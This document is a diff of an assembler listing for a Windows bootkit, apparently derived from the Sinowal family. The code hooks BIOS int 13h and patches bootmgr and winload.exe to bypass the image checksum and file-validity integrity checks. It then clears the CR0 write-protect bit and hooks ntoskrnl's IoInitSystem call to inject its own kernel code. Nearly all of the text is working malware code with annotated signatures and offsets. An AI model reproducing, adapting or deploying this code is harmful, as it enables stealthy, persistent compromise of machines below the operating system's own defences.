@@ -16,7 +16,7 @@
     16                                  
     17                                  ; now copy this boot application to the end of memory (by default 4 KB size, the reserved size)
     18 00000010 BE007E                  mov si,7e00h
-    19 00000013 66B9[DF040000]          mov ecx,Total_End_of_Binary
+    19 00000013 66B9[F0040000]          mov ecx,Total_End_of_Binary
     20 00000019 F3A4                    rep movsb
     21                                  
     22                                  ; backup old int 13h vector
@@ -147,636 +147,648 @@
    132 0000014B 2666817D0A00E93500          cmp dword [es:di+10],0035E900h
    133 00000154 75D3                        jnz Search_Signature_3
    134                                  
-   135                                      ; apply patch:
-   136                                      ;   + 66 9A ADDRESS 20 90
-   137                                      Found_Signature_bootmgr:
-   138 00000156 2E800E[9D01]08              or [cs:Configuration_Bits],byte 00001000b 
-   139 0000015C 4F                          dec di
-   140 0000015D BE[7D00]                    mov si,Bootmgr_sign_found_Message
-   141 00000160 E8DFFE                      call Print_Text
-   142 00000163 E83800                      call wait_key
-   143                                      ;jmp read_ok_handler
-   144                                     ;jmp Remove_Interrupt_13h_Hook
-   145                                      
-   146                                      ; do patch work
-   147 00000166 26C705669A                  mov word [es:di],0x9A66   ; patch something
-   148 0000016B 6631C0                      xor eax,eax
-   149 0000016E 8CC8                        mov ax,cs
-   150 00000170 66C1E004                    shl eax,4
-   151 00000174 6605[A9010000]              add eax,Entry_Point_OS_Vista
-   152 0000017A 2666894502                  mov [es:di+0x2],eax 
-   153 0000017F 26C745062000                mov word [es:di+0x6],0x20  
-   154 00000185 26C6450890                  mov byte [es:di+0x8],0x90 
-   155                                  
-   156                                  ;Remove_Interrupt_13h_Hook:
-   157                                      ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
-   158                                     ; xor bx,bx
-   159                                      ;mov ds,bx
-   160                                    ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)
-   161                                  
-   162                                  bootmgr_already_patched:
-   163                                  read_ok_handler:
-   164 0000018A 07                      pop es   ; restore all register contents as it was before this hook
-   165 0000018B 1F                      pop ds
-   166 0000018C 9D                      popf
-   167 0000018D 6661                    popad
-   168 0000018F B400                    mov ah,0
-   169                                  read_fail_handler:
-   170 00000191 83C402                      add sp, 2 ; pop the cmd
-   171 00000194 CA0200                      retf 2
-   172                                  
-   173                                  exit_and_call_origin:
-   174 00000197 9D                          popf
-   175 00000198 6661                        popad
-   176 0000019A E94CFF                      jmp Forward_Interrupt_13h_Original
-   177                                  
-   178 0000019D 00                      Configuration_Bits    db  00000000b
+   135                                      ; in win7sp1_x32 this will execute twice
+   136                                      ; but in win8.1_x64 will only execute  once
+   137                                      ; apply patch:
+   138                                      ;   + 66 9A ADDRESS 20 90
+   139                                      Found_Signature_bootmgr:
+   140 00000156 2E800E[9D01]08              or [cs:Configuration_Bits],byte 00001000b 
+   141 0000015C 4F                          dec di
+   142 0000015D BE[7D00]                    mov si,Bootmgr_sign_found_Message
+   143 00000160 E8DFFE                      call Print_Text
+   144 00000163 E83800                      call wait_key
+   145                                      ;jmp read_ok_handler
+   146                                     ;jmp Remove_Interrupt_13h_Hook
+   147                                      
+   148                                      ; do patch work
+   149 00000166 26C705669A                  mov word [es:di],0x9A66   ; patch something
+   150 0000016B 6631C0                      xor eax,eax
+   151 0000016E 8CC8                        mov ax,cs
+   152 00000170 66C1E004                    shl eax,4
+   153 00000174 6605[A9010000]              add eax,Entry_Point_OS_Vista
+   154 0000017A 2666894502                  mov [es:di+0x2],eax 
+   155 0000017F 26C745062000                mov word [es:di+0x6],0x20  
+   156 00000185 26C6450890                  mov byte [es:di+0x8],0x90 
+   157                                  
+   158                                  ;Remove_Interrupt_13h_Hook:
+   159                                      ;mov eax,[Forward_Interrupt_13h_Original+1]   ; offset of original int 13h
+   160                                     ; xor bx,bx
+   161                                      ;mov ds,bx
+   162                                    ;  mov [13h * 4],eax               ; restore interrupt 13h vector (reset offset)
+   163                                  
+   164                                  bootmgr_already_patched:
+   165                                  read_ok_handler:
+   166 0000018A 07                      pop es   ; restore all register contents as it was before this hook
+   167 0000018B 1F                      pop ds
+   168 0000018C 9D                      popf
+   169 0000018D 6661                    popad
+   170 0000018F B400                    mov ah,0
+   171                                  read_fail_handler:
+   172 00000191 83C402                      add sp, 2 ; pop the cmd
+   173 00000194 CA0200                      retf 2
+   174                                  
+   175                                  exit_and_call_origin:
+   176 00000197 9D                          popf
+   177 00000198 6661                        popad
+   178 0000019A E94CFF                      jmp Forward_Interrupt_13h_Original
    179                                  
-   180                                  wait_key:
-   181 0000019E 6660                    pushad
-   182 000001A0 9C                      pushf
-   183 000001A1 30E4                    xor ah,ah                                       ; Function 00h: Get Keystroke
-   184 000001A3 CD16                    int 16h
-   185 000001A5 9D                      popf
-   186 000001A6 6661                    popad
-   187 000001A8 C3                      ret
-   188                                  
-   189                                  ; protected code start called by bootmgr SU module
-   190                                  [bits 32]
-   191                                  Entry_Point_OS_Vista:
-   192 000001A9 90                      nop
-   193 000001AA 90                      nop
-   194 000001AB 90                      nop
-   195 000001AC 90                      nop
-   196 000001AD 60                      pushad
-   197 000001AE 06                      push es
-   198 000001AF 1E                      push ds
-   199                                  
-   200                                  ; we need to set correct segment register (this is also why this function was far called)
-   201                                  ;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
-   202                                  ;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
-   203                                  ;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
-   204                                  ;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
-   205                                  ;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
-   206                                  ;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
-   207                                  ;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
-   208                                  ;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
-   209                                  ;   gdtr:base=0x0001f000, limit=0x7f
-   210                                  ;   idtr:base=0x0001f080, limit=0x7ff
-   211 000001B0 B830000000              mov eax,0x30   ; set to 30h, Data Segment
-   212 000001B5 8EC0                    mov es,ax
-   213 000001B7 8ED8                    mov ds,ax
-   214                                  ; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
-   215 000001B9 BF00004000              mov edi,00400000h   ; OS Loader base
-   216 000001BE B900000F00              mov ecx,960 * 1024 
-   217 000001C3 E800000000              call dword Get_Current_EIP_2
-   218                                  Get_Current_EIP_2:
-   219 000001C8 5E                      pop esi
-   220 000001C9 81C635010000            add esi,Relocate_Me_Code - Get_Current_EIP_2
-   221 000001CF E8CD000000              call dword Hook_WinloadExe
-   222                                  
-   223 000001D4 1F                      pop ds   ; restore them
-   224 000001D5 07                      pop es
-   225 000001D6 61                      popad
-   226 000001D7 CB                      retf
-   227                                  
-   228                                  ; 加载的第一个pe 是 bootmgr.exe.mui
-   229                                  FakeImgpLoadPEImage:
-   230                                  ; 1. called by OSLOADER resisting in bootmgr 
-   231                                  ; 2. return address is 0x4216a8
-   232                                  ; 3. ebx(0x2700c0 the pe file header   )
-   233 000001D8 E82E010000              call dword Obfuscation_Function
-   234                                  
-   235                                  ; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
-   236                                  ; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
-   237                                  ; _text:004216A5 74 18                                   jz      short loc_4216BF
-   238                                  ; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
-   239 000001DD 0FBE4604                movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
-   240 000001E1 48                      dec eax ; -1 because call [address] used 1 more byte
-   241 000001E2 0144242C                add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
-   242                                  ; xchg 替换成了 ebx 即 pe file header)
-   243                                  
-   244                                  ; why ??????????????????????????????????????
-   245                                  ; get caller's eax register
-   246 000001E6 8D5706                  lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
-   247 000001E9 0FB64601                movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
-   248 000001ED F6D0                    not al     ; = BCh
-   249 000001EF 2407                    and al,00000111b        ; = 04h
-   250 000001F1 0402                    add al,2        ; = 06h
-   251 000001F3 8B3C84                  mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..
-   252                                  
-   253                                  ; valid PE Image?
-   254 000001F6 813F50450000            cmp dword [edi],'PE' ; verify PE Signature
-   255 000001FC 751F                    jnz Exit_FakeImgpLoadPEImage
-   256 000001FE 66817F180B01            cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
-   257 00000204 7517                    jnz Exit_FakeImgpLoadPEImage
-   258                                  
-   259                                  ; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
-   260 00000206 8B4F50                  mov ecx,[edi+0x50]  ; SizeOfImage
-   261 00000209 81E700F0FFFF            and edi,0FFFFF000h  ; page base address of PE Image
-   262 0000020F E88D000000              call dword Hook_WinloadExe
-   263 00000214 7407                    jz Exit_FakeImgpLoadPEImage
-   264                                  
-   265                                  ; find the signature in ntoskrnl and patch the code
-   266 00000216 E844000000              call Find_Ntoskrnl_Code_Pattern
-   267 0000021B 7405                    jz Patch_Kernel_Code_Vista   ; if found, patch!
-   268                                  Exit_FakeImgpLoadPEImage:
-   269 0000021D E908010000              jmp Obfuscation_Return ; return to Windows
-   270                                  
-   271                                  Patch_Kernel_Code_Vista:
-   272                                  ; ebx = some address 
-   273                                  ; ecx = size of image of nt kernel
-   274                                  ; edi = nt kernel image base address
-   275 00000222 90                      nop
-   276 00000223 90                      nop
-   277                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
-   278                                  ; remember original jump address
-   279 00000224 8B13                    mov edx,[ebx]  ; edx = [signature], must be some address
-   280 00000226 8D541304                lea edx,[ebx+edx+4]  ; signature address + relative jump address + 4 = return address
-   281 0000022A 89560A                  mov [esi+10],edx  ; store return address to temporary code (ntkernel_Hook_Address)
-   282                                  
-   283 0000022D 81C700080000            add edi,2048  
-   284 00000233 EB00                    jmp Patch_Kernel_Code
-   285                                  
-   286                                  ; patch the NT Kernel with Kernel Code  =)
-   287                                  Patch_Kernel_Code:
-   288 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
-   289 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
-   290 00000241 81EF00080000            sub edi,2048;
-   291 00000247 B9E2010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
-   292 0000024C 57                      push edi
-   293 0000024D F3A4                    rep movsb
-   294 0000024F 5F                      pop edi
-   295                                  
-   296 00000250 83C735                  add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code   ; -> absolute Kernel Code entry point address
-   297 00000253 29DF                    sub edi,ebx    ; - address of call
-   298 00000255 83EF04                  sub edi,4  ; -4 because of call instruction, relative call
-   299 00000258 893B                    mov [ebx],edi    ; store address
-   300 0000025A E9CB000000              jmp dword Obfuscation_Return
-   301                                  
-   302                                  Find_Ntoskrnl_Code_Pattern:
-   303                                  ; Phase1InitializationDiscard
-   304                                  ; INIT:007BF3E0 6A 19                                   push    19h
-   305                                  ; INIT:007BF3E2 6A 4B                                   push    4Bh
-   306                                  ; INIT:007BF3E4 58                                      pop     eax
-   307                                  ; INIT:007BF3E5 E8 C4 6D C4 FF                          call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
-   308                                  ; INIT:007BF3EA 56                                      push    esi             ; NewIrql
-   309                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
-   310                                  ; INIT:007BF3F0 84 C0                                   test    al, al
-   311                                  ; INIT:007BF3F2 75 07                                   jnz     short loc_7BF3FB
-   312                                  ; Input
-   313                                  ;   ecx = SizeOfImage
-   314                                  ;   edi = Image
-   315                                  ; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
-   316                                  ; return status zero flag = 1 found
-   317 0000025F 51                      push ecx
-   318 00000260 57                      push edi
-   319                                  
-   320                                  ; scan ntoskrnl.exe for code patterns [+ for Vista]:
-   321                                  ;   +  6A 4B 6A 19 / 6A 19 6A 4B
-   322                                  ;     ntoskrnl.1CE87E0h
-   323                                  ;			memory.0x80683ec9
-   324                                  Scan_Pattern_Ntoskrnl:
-   325 00000261 B06A                    mov al,0x6a
-   326 00000263 F2AE                    repne scasb
-   327 00000265 7537                    jnz Find_Ntoskrnl_Code_Pattern_Exit
-   328 00000267 817FFF6A4B6A19          cmp dword [edi-0x1],0x196A4B6A
-   329 0000026E 740A                    jz Signature_1_Found
-   330 00000270 817FFF6A196A4B          cmp dword [edi-0x1],0x4B6A196A
-   331 00000277 75E8                    jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
-   332 00000279 47                      inc edi   ; weird signature
-   333                                  Signature_1_Found:
-   334 0000027A 807F0389                cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
-   335 0000027E 7503                    jnz No_Extended_Signature
-   336 00000280 83C706                  add edi,byte +0x6
-   337                                  No_Extended_Signature:
-   338 00000283 807F03E8                cmp byte [edi+0x3],0xe8
-   339 00000287 75D8                    jnz Scan_Pattern_Ntoskrnl
-   340                                  
-   341                                  ; first pattern found, scan for next [same as in previous Sinowal version] signature:
-   342                                  ;   + E8 ?? ?? ?? ?? 84 C0
-   343                                  ;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
-   344                                  ;			memory.0x80683ed8						memory.0x80683EDD
-   345 00000289 8D5F08                  lea ebx,[edi+0x8]
-   346 0000028C 87DF                    xchg ebx,edi
-   347 0000028E B0E8                    mov al,0xe8
-   348 00000290 F2AE                    repne scasb
-   349 00000292 750A                    jnz Find_Ntoskrnl_Code_Pattern_Exit
-   350 00000294 66817F0484C0            cmp word [edi+0x4],0xc084
-   351 0000029A 87DF                    xchg ebx,edi
-   352 0000029C 75C3                    jnz Scan_Pattern_Ntoskrnl
-   353                                  
-   354                                  Find_Ntoskrnl_Code_Pattern_Exit:
-   355 0000029E 5F                      pop edi
-   356 0000029F 59                      pop ecx
-   357 000002A0 C3                      ret
-   358                                  
-   359                                  Hook_WinloadExe:
-   360                                  ; Input
-   361                                  ;   esi = address of Relocate_Me_Code
-   362                                  ;   edi = address of memory to scan
-   363                                  ;   ecx = bytes to scan
-   364                                  ; Output
-   365                                  ; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
-   366 000002A1 51                      push ecx
-   367 000002A2 57                      push edi
-   368                                  
-   369                                  ; scan winload for some jump offset in _ImgpLoadPEImage@36  
-   370                                  ;   + 3B ?? 58 74 ?? C7
-   371                                  ; patch applied: winload.exe will be hooked
-   372                                  ;   0041e8c0:  cmp eax, dword ptr ds:[ebx+0x58]         ; 3b4358            ->      call [address]
-   373                                  ;   0041e8c3:  jz .+0x0000000c                          ; 740c              ->
-   374                                  ;   0041e8c5:  mov dword ptr ss:[ebp+0x8], 0xc0000221   ; c74508210200c0    (STATUS_IMAGE_CHECKSUM_MISMATCH)
-   375                                  Search_Unknown_Signature:
-   376 000002A3 B03B                    mov al,0x3b
-   377 000002A5 F2AE                    repne scasb
-   378 000002A7 7551                    jnz Hook_WinloadExe_Exit
-   379 000002A9 66817F015874            cmp word [edi+0x1],0x7458
-   380 000002AF 75F2                    jnz Search_Unknown_Signature
-   381 000002B1 807F04C7                cmp byte [edi+0x4],0xC7
-   382 000002B5 75EC                    jnz Search_Unknown_Signature
-   383                                  
-   384                                  ; backup 6 bytes to overwrite them with custom code
-   385                                  ; break in 0x9edf5
-   386 000002B7 4F                      dec edi                                                                         ; -1 to get to start of signature
-   387 000002B8 8B07                    mov eax,[edi]                                                                   ; copy 4 bytes
-   388 000002BA 8906                    mov [esi],eax
-   389 000002BC 668B4704                mov ax,[edi+4]                                                                  ; copy 2 bytes
-   390 000002C0 66894604                mov [esi+4],ax
-   391                                  
-   392                                  ; store new code: FF 15 + address  (call hook)
-   393 000002C4 66B8FF15                mov ax,0x15FF  ; FF 15, opcodes of call [address]
-   394 000002C8 66AB                    stosw          
-   395 000002CA 8D86DBFEFFFF            lea eax,[esi - (Relocate_Me_Code - FakeImgpLoadPEImage)]   ; get offset of hook code
-   396 000002D0 26894606                mov [es:esi+6],eax ; set the Hook_Address variable
-   397 000002D4 8D4606                  lea eax,[esi+6]   ; get address of variable address, used for call [address]
-   398 000002D7 AB                      stosd 
-   399                                  
-   400                                  ; restore (and store) register contents for searching the next signature
-   401 000002D8 5F                      pop edi
-   402 000002D9 59                      pop ecx
-   403 000002DA 51                      push ecx
-   404 000002DB 57                      push edi
-   405                                  
-   406                                  ; scan winload for the code that puts ntoskrnl corrupt error status
-   407                                  ;   + 8B F0 85 F6 75   and value 0C0000098h
-   408                                  ; 8B F0 85 F6 75 ?? ?? 980000c0
-   409                                  ; patch applied: STATUS_FILE_INVALID error code will be overwritten
-   410                                  ;   0041f076:  lock test esi, esi        ; f085f6
-   411                                  ;   0041f079:  jnz .+0x0000000a          ; 750a
-   412                                  ;   0041f07b:  mov eax, 0xc0000098       ; b8980000c0   ->    mov eax,0
-   413                                  Search_Ntoskrnl_Error_Code:
-   414 000002DC B08B                    mov al,0x8b
-   415 000002DE F2AE                    repne scasb
-   416 000002E0 7518                    jnz Hook_WinloadExe_Exit
-   417 000002E2 813FF085F675            cmp dword [edi],0x75f685F0
-   418 000002E8 75F2                    jnz Search_Ntoskrnl_Error_Code
-   419 000002EA 817F06980000C0          cmp dword [edi+0x6],0xC0000098  ; ntoskrnl.exe missing or corrupt (Error 0xC0000098), STATUS_FILE_INVALID
-   420 000002F1 75E9                    jnz Search_Ntoskrnl_Error_Code
-   421 000002F3 C7470600000000          mov dword [edi+0x6],0x0      ;  set ret value to  STATUS_SUCCESS
-   422                                  
-   423                                  Hook_WinloadExe_Exit:
-   424 000002FA 5F                      pop edi
-   425 000002FB 59                      pop ecx
-   426 000002FC C3                      ret
-   427                                  
-   428                                  Relocate_Me_Code:
-   429 000002FD 90                      nop
-   430 000002FE 90                      nop
-   431 000002FF 90                      nop
-   432 00000300 90                      nop
-   433 00000301 90                      nop
-   434 00000302 90                      nop
-   435 00000303 00000000                Hook_Address    dd  0
-   436 00000307 00000000                ntkernel_Hook_Address    dd  0
-   437                                  
-   438                                  Obfuscation_Function:
-   439                                  ; [stack + 0] = address to jump to
-   440                                  ; [stack + 4] = passed further in edi  -> return address to Windows / Argument 2
-   441                                  
-   442                                  ; Output:
-   443                                  ; esi = pointer to Relocate_Me_Code
-   444                                  ; edi = pointer to return code of Windows / Argument 2
-   445                                  
-   446                                  ; during execution all memory access is possible is cr0.wp cleared
-   447                                  ; return by jumping to Obfuscation_Return
-   448                                  
-   449 0000030B 60                      pushad   ; +32
-   450 0000030C 9C                      pushfd     ; +4
-   451 0000030D FC                      cld
-   452                                  
-   453                                  ; clear cr0.Write Protect flag (to allow writing into read-only user pages)
-   454 0000030E 0F20C0                  mov eax,cr0
-   455 00000311 50                      push eax ; +4
-   456 00000312 25FFFFFEFF              and eax,0FFFEFFFFh ; clear cr0.WP (bit 16), it is normally set in Windows
+   180 0000019D 00                      Configuration_Bits    db  00000000b
+   181                                  
+   182                                  wait_key:
+   183 0000019E 6660                    pushad
+   184 000001A0 9C                      pushf
+   185 000001A1 30E4                    xor ah,ah                                       ; Function 00h: Get Keystroke
+   186 000001A3 CD16                    int 16h
+   187 000001A5 9D                      popf
+   188 000001A6 6661                    popad
+   189 000001A8 C3                      ret
+   190                                  
+   191                                  ; protected code start called by bootmgr SU module
+   192                                  [bits 32]
+   193                                  Entry_Point_OS_Vista:
+   194 000001A9 90                      nop
+   195 000001AA 90                      nop
+   196 000001AB 90                      nop
+   197 000001AC 90                      nop
+   198 000001AD 60                      pushad
+   199 000001AE 06                      push es
+   200 000001AF 1E                      push ds
+   201                                  
+   202                                  ; we need to set correct segment register (this is also why this function was far called)
+   203                                  ;   cs:s=0x0020, dh=0x00cf9a00, dl=0x0000ffff, valid=1
+   204                                  ;   ds:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
+   205                                  ;   ss:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=7
+   206                                  ;   es:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
+   207                                  ;   fs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
+   208                                  ;   gs:s=0x0060, dh=0x00009302, dl=0x3420ffff, valid=1
+   209                                  ;   ldtr:s=0x0000, dh=0x00008200, dl=0x0000ffff, valid=0
+   210                                  ;   tr:s=0x0040, dh=0x00008b02, dl=0x48a00077, valid=1
+   211                                  ;   gdtr:base=0x0001f000, limit=0x7f
+   212                                  ;   idtr:base=0x0001f080, limit=0x7ff
+   213 000001B0 B830000000              mov eax,0x30   ; set to 30h, Data Segment
+   214 000001B5 8EC0                    mov es,ax
+   215 000001B7 8ED8                    mov ds,ax
+   216                                  ; scan OS Loader (32 bit executable embedded in bootmgr) for a signature
+   217 000001B9 BF00004000              mov edi,00400000h   ; OS Loader base
+   218 000001BE B900000F00              mov ecx,960 * 1024 
+   219 000001C3 E800000000              call dword Get_Current_EIP_2
+   220                                  Get_Current_EIP_2:
+   221 000001C8 5E                      pop esi
+   222 000001C9 81C646010000            add esi,Relocate_Me_Code - Get_Current_EIP_2
+   223 000001CF E8CD000000              call dword Hook_WinloadExe
+   224                                  
+   225 000001D4 1F                      pop ds   ; restore them
+   226 000001D5 07                      pop es
+   227 000001D6 61                      popad
+   228 000001D7 CB                      retf
+   229                                  
+   230                                  ; 加载的第一个pe 是 bootmgr.exe.mui
+   231                                  FakeImgpLoadPEImage:
+   232                                  ; 1. called by OSLOADER resisting in bootmgr 
+   233                                  ; 2. return address is 0x4216a8
+   234                                  ; 3. ebx(0x2700c0 the pe file header   )
+   235 000001D8 E83F010000              call dword Obfuscation_Function
+   236                                  
+   237                                  ; move return eip to the "successful branch" (skip the STATUS_IMAGE_CHECKSUM_MISMATCH)
+   238                                  ; _text:004216A2 3B 43 58                                cmp     eax, [ebx+58h]
+   239                                  ; _text:004216A5 74 18                                   jz      short loc_4216BF
+   240                                  ; C7 45 F8 21 02 00 C0    mov     [ebp+var_8], 0C0000221h ; STATUS_IMAGE_CHECKSUM_MISMATCH
+   241 000001DD 0FBE4604                movsx eax,byte [esi+4] ; esi = Relocate_Me_Code, get jump offset of original code from the backup
+   242 000001E1 48                      dec eax ; -1 because call [address] used 1 more byte
+   243 000001E2 0144242C                add [esp+0x2c],eax ; return eip (2Ch = pushad 32 + pushfd 4  + push eax 4 + call dword Obfuscation_Function 返回地址
+   244                                  ; xchg 替换成了 ebx 即 pe file header)
+   245                                  
+   246                                  ; why ??????????????????????????????????????
+   247                                  ; get caller's eax register
+   248 000001E6 8D5706                  lea edx,[edi+0x6]    ; original return address + 6 指令被截断了,需要跳过剩下的6 字节
+   249 000001E9 0FB64601                movzx eax,byte [esi+0x1]  ; register (eax, 43) of compare opcode
+   250 000001ED F6D0                    not al     ; = BCh
+   251 000001EF 2407                    and al,00000111b        ; = 04h
+   252 000001F1 0402                    add al,2        ; = 06h
+   253 000001F3 8B3C84                  mov edi,[esp+eax*4]      ; stack + 6*4  =>  get ebx register..
+   254                                  
+   255                                  ; valid PE Image?
+   256 000001F6 813F50450000            cmp dword [edi],'PE' ; verify PE Signature
+   257 000001FC 751F                    jnz Exit_FakeImgpLoadPEImage
+   258 000001FE 66817F180B01            cmp word [edi+0x18],010Bh  ; 010Bh, Magic Number (PE32)
+   259 00000204 7517                    jnz Exit_FakeImgpLoadPEImage
+   260                                  
+   261                                  ; scan bootmgr.exe.mui for removing code integrity check, again (shouldn't appear anyway)
+   262 00000206 8B4F50                  mov ecx,[edi+0x50]  ; SizeOfImage
+   263 00000209 81E700F0FFFF            and edi,0FFFFF000h  ; page base address of PE Image
+   264 0000020F E88D000000              call dword Hook_WinloadExe
+   265 00000214 7407                    jz Exit_FakeImgpLoadPEImage
+   266                                  
+   267                                  ; find the signature in ntoskrnl and patch the code
+   268 00000216 E844000000              call Find_Ntoskrnl_Code_Pattern
+   269 0000021B 7405                    jz Patch_Kernel_Code_Vista   ; if found, patch!
+   270                                  Exit_FakeImgpLoadPEImage:
+   271 0000021D E919010000              jmp Obfuscation_Return ; return to Windows
+   272                                  
+   273                                  Patch_Kernel_Code_Vista:
+   274                                  ; ebx = some address 
+   275                                  ; ecx = size of image of nt kernel
+   276                                  ; edi = nt kernel image base address
+   277 00000222 90                      nop
+   278 00000223 90                      nop
+   279                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
+   280                                  ; remember original jump address
+   281 00000224 8B13                    mov edx,[ebx]  ; edx = [signature], must be some address
+   282 00000226 8D541304                lea edx,[ebx+edx+4]  ; signature address + relative jump address + 4 = return address
+   283 0000022A 89560A                  mov [esi+10],edx  ; store return address to temporary code (ntkernel_Hook_Address)
+   284                                  
+   285 0000022D 81C700080000            add edi,2048  
+   286 00000233 EB00                    jmp Patch_Kernel_Code
+   287                                  
+   288                                  ; patch the NT Kernel with Kernel Code  =)
+   289                                  Patch_Kernel_Code:
+   290 00000235 81C7FF0F0000            add edi,00000FFFh  ; get end of page
+   291 0000023B 81E700F0FFFF            and edi,0FFFFF000h  ; page base address
+   292 00000241 81EF00080000            sub edi,2048;
+   293 00000247 B9E2010000              mov ecx,Total_End_of_Binary - Relocate_Me_Code  ; size of further code
+   294 0000024C 57                      push edi
+   295 0000024D F3A4                    rep movsb
+   296 0000024F 5F                      pop edi
+   297                                  
+   298 00000250 83C735                  add edi,Ntoskrnl_Hook_Code - Relocate_Me_Code   ; -> absolute Kernel Code entry point address
+   299 00000253 29DF                    sub edi,ebx    ; - address of call
+   300 00000255 83EF04                  sub edi,4  ; -4 because of call instruction, relative call
+   301 00000258 893B                    mov [ebx],edi    ; store address
+   302 0000025A E9DC000000              jmp dword Obfuscation_Return
+   303                                  
+   304                                  Find_Ntoskrnl_Code_Pattern:
+   305                                  ; Phase1InitializationDiscard
+   306                                  ; INIT:007BF3E0 6A 19                                   push    19h
+   307                                  ; INIT:007BF3E2 6A 4B                                   push    4Bh
+   308                                  ; INIT:007BF3E4 58                                      pop     eax
+   309                                  ; INIT:007BF3E5 E8 C4 6D C4 FF                          call    _InbvSetProgressBarSubset@8 ; InbvSetProgressBarSubset(x,x)
+   310                                  ; INIT:007BF3EA 56                                      push    esi             ; NewIrql
+   311                                  ; INIT:007BF3EB E8 ED B7 FF FF                          call    _IoInitSystem@4 ; IoInitSystem(x)
+   312                                  ; INIT:007BF3F0 84 C0                                   test    al, al
+   313                                  ; INIT:007BF3F2 75 07                                   jnz     short loc_7BF3FB
+   314                                  ; Input
+   315                                  ;   ecx = SizeOfImage
+   316                                  ;   edi = Image
+   317                                  ; return value ebx = pointer to code pattern with startin code E8 (= relative call opcode)
+   318                                  ; return status zero flag = 1 found
+   319 0000025F 51                      push ecx
+   320 00000260 57                      push edi
+   321                                  
+   322                                  ; scan ntoskrnl.exe for code patterns [+ for Vista]:
+   323                                  ;   +  6A 4B 6A 19 / 6A 19 6A 4B
+   324                                  ;     ntoskrnl.1CE87E0h
+   325                                  ;			memory.0x80683ec9
+   326                                  Scan_Pattern_Ntoskrnl:
+   327 00000261 B06A                    mov al,0x6a
+   328 00000263 F2AE                    repne scasb
+   329 00000265 7537                    jnz Find_Ntoskrnl_Code_Pattern_Exit
+   330 00000267 817FFF6A4B6A19          cmp dword [edi-0x1],0x196A4B6A
+   331 0000026E 740A                    jz Signature_1_Found
+   332 00000270 817FFF6A196A4B          cmp dword [edi-0x1],0x4B6A196A
+   333 00000277 75E8                    jnz Scan_Pattern_Ntoskrnl  ; if not equal => continue search
+   334 00000279 47                      inc edi   ; weird signature
+   335                                  Signature_1_Found:
+   336 0000027A 807F0389                cmp byte [edi+0x3],0x89    ; 2 possible valid signatures
+   337 0000027E 7503                    jnz No_Extended_Signature
+   338 00000280 83C706                  add edi,byte +0x6
+   339                                  No_Extended_Signature:
+   340 00000283 807F03E8                cmp byte [edi+0x3],0xe8
+   341 00000287 75D8                    jnz Scan_Pattern_Ntoskrnl
+   342                                  
+   343                                  ; first pattern found, scan for next [same as in previous Sinowal version] signature:
+   344                                  ;   + E8 ?? ?? ?? ?? 84 C0
+   345                                  ;     ntoskrnl.1CE87F3h						ntoskrnl.1CE87F8h
+   346                                  ;			memory.0x80683ed8						memory.0x80683EDD
+   347 00000289 8D5F08                  lea ebx,[edi+0x8]
+   348 0000028C 87DF                    xchg ebx,edi
+   349 0000028E B0E8                    mov al,0xe8
+   350 00000290 F2AE                    repne scasb
+   351 00000292 750A                    jnz Find_Ntoskrnl_Code_Pattern_Exit
+   352 00000294 66817F0484C0            cmp word [edi+0x4],0xc084
+   353 0000029A 87DF                    xchg ebx,edi
+   354 0000029C 75C3                    jnz Scan_Pattern_Ntoskrnl
+   355                                  
+   356                                  Find_Ntoskrnl_Code_Pattern_Exit:
+   357 0000029E 5F                      pop edi
+   358 0000029F 59                      pop ecx
+   359 000002A0 C3                      ret
+   360                                  
+   361                                  Hook_WinloadExe:
+   362                                  ; Input
+   363                                  ;   esi = address of Relocate_Me_Code
+   364                                  ;   edi = address of memory to scan
+   365                                  ;   ecx = bytes to scan
+   366                                  ; Output
+   367                                  ; zf  0 if bootmgr.exe bootmgr.exe.mui   winload.exe has been succssful patched.
+   368 000002A1 51                      push ecx
+   369 000002A2 57                      push edi
+   370                                  
